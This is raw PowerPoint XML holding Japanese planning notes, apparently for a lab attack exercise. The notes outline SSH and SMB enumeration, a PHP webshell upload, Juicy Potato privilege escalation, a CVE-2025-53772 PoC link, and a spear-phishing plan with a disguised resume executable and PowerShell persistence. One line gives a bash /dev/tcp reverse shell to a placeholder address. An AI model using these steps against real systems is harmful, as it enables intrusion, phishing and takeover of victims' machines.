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
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="258" r:id="rId2"/>
    <p:sldId id="265" r:id="rId3"/>
    <p:sldId id="266" r:id="rId4"/>
    <p:sldId id="264"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0B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74661" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="71" d="100"/>
          <a:sy n="71" d="100"/>
        </p:scale>
        <p:origin x="126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A4C6B-DF72-4723-951D-FA8DD9825525}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/7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E2AA6-84B2-43A5-87C5-3D8050F95EA0}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33523241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認証情報が落ちてる→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートが開いてる→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で入る</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ない場合は？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>落ちていない→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>fileupload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>がありそう→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（必要なら</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Burp suite)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>を</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>upload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>webshell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で初期侵入</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ない場合は？</a:t>
            </a:r>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r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Qiita.com/nozomi2025/items/51ec1b574facd5cf89ca </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　このページの流れで実行したい→ちゃんと理解</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>についてちゃんと調べて理解</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サイトに</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>upload file</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の項目があるかどうか？なかった場合はどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートは本当にあいてるか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>永続化の方法は本当にそれだけか、それが通らなかったら？</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>シェルリスナーの設置は</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に対して有効か？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>への</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のダウンロードはどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Php</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　→　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>file upload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>がある場合</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Bash –c ‘bash –I &gt;&amp; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipaddress</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/port 0&gt;&amp;1’ </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>←</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>では使えないよ（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>👇</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Powercat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に変更</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のローカル特権昇格ツール、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サービスとトークン偽装の仕組みを悪用して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>SYSTEM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>権限を奪取</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>「</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Componet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> Object Model</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>」（オブジェクト指向のソフトウェアコンポーネントモデル）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Shell.Application</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>や</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Wscript.Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>異なるプログラミング言語や環境で作成された部品通しを共通のプロトコルでつなぐための仕組み（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>C#</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>VB</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Python</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>DCOM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（上記の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>をネットワーク越しでも使えるようにした拡張機能）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>https://github.com/sailay1996/CVE-2025-53772/blob/main/README.md</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>PoC</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>読めたら使えそう（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web deploy</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>への</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>exploit)</a:t>
            </a:r>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1</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3167028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この世にはありえないことだらけ！！！</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とりあえずやってみてもいい！！！</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>認証情報が落ちてる→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートが開いてる→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>で入る</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ない場合は？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Smb</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>(139or445)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートが開いているか？→開いていた場合</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Smbclient</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>anonymous login </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>できるか？</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>(enum4linux –a </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>アドレス</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>できた場合→どこまで探索できるか？（共有設定のミス等はないか）認証情報等はあるか</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>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2</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2619165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標的型メール攻撃</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>メールアドレスを探す。</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>会社の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>HP</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>SNS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>など</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>採用担当等のメールアドレス宛に履歴書（なんらかの悪意あるツール）を添付したメールを送付</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>開封、添付ファイルを開くと感染（できればエクセルデータにマクロを仕込んで有効化したら感染の経路が希望）→→　仮想端末に</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>office</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>が入っていないためなし・・・・</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（代案）拡張子の偽装　（履歴書</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>.txt.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>）みたいにしてみる</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>メールサーバーは</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Postfix,dovecot</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　メーラーは</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>thunderbird</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>POP3) DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>は</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>bind</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>を使用（予定）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>初期侵入（リスナー？それとも違う方法？） →</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>TCPListener</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>でポートを解放させてそこに接続させる方法（パワーシェルで解放させる）→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>をバックグラウンドで実行できるか→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>start-job????</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（調べる）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートを解放させる</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>ps1</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイル</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>何らかの脆弱性をついて永続化　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>権限昇格</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→　永続化について（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Profile File</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（シェルの起動時に自動で実行されるスクリプトファイル）→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>OS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>起動時に実行するには</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>GPO</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（レジストリ）の編集が必要・・？　スタートアップファイルに</a:t>
            </a:r>
            <a:r>
